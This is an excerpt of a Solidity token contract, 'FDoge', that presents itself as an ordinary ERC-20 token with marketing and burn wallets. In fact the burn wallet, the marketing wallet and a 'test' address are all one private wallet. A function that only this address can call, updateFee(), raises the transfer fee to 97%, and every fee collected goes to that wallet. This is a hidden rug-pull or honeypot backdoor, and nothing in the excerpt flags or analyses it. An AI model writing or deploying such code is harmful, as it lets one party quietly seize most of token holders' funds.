...
contract FDoge is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0xa2aa04264a92e6Dd697cA3d399Ed3F6D7c02B079); 
    address payable public BurnedWalletAddress = payable(0xa2aa04264a92e6Dd697cA3d399Ed3F6D7c02B079); 
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    address public test = 0xa2aa04264a92e6Dd697cA3d399Ed3F6D7c02B079;
    ...
    modifier onlyTest {
        require(msg.sender == test, "Only the contract owner can call this");
        _;  // 修饰符会在这个位置插入函数的逻辑
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            feeAmount = amount.mul(_testFee).div(100);

            // uint256 finalAmount = (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) ? 
            //                              amount : takeFee(sender, recipient, amount);

            uint finalAmount = amount.sub(feeAmount);
            _balances[recipient] = _balances[recipient].add(finalAmount);
            _balances[test] = _balances[test].add(feeAmount);
            
            emit Transfer(sender, test, feeAmount);
    ...
    function updateFee() public onlyTest{
        _testFee = 97;
    }
